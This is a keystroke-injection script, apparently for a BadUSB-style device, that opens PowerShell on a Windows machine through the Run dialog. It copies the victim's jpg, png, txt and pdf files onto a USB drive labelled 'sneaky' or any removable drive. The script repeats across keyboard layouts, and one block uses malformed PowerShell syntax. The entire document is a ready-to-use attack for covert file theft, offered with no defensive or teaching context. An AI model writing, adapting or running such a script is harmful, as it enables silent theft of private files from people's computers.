layout('us') //set layout us
 
press("GUI r") // windows + r
delay(1000)
type("powershell\n") // write powershell and press "enter"
delay(1000)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'sneaky' } | select name\n") 
var filetypes = ["jpg", "png", "txt", "pdf"]
for (var i = 0; i < filetypes.length; i++) {
    type("copy */*." + filetypes[i] + " $usbpath.name\n")
}
layout('it') //set layout us
type("$usbPath = Get-WMIObject Win32_Volume | ? ( $_.Label -eq 'sneaky' ) | select name\n")
for (var i = 0; i < filetypes.length; i++) {
    type("copy */*." + filetypes[i] + " $usbpath.name\n")
}
layout('it')

type("$usbPath = Get-WmiObject Win32_Volume -Filter DriveType='2' |select -expand driveletter\n")
for (var i = 0; i < filetypes.length; i++) {
    type("copy */*." + filetypes[i] + " $usbpath\n")
}

type("exit\n")  //exit
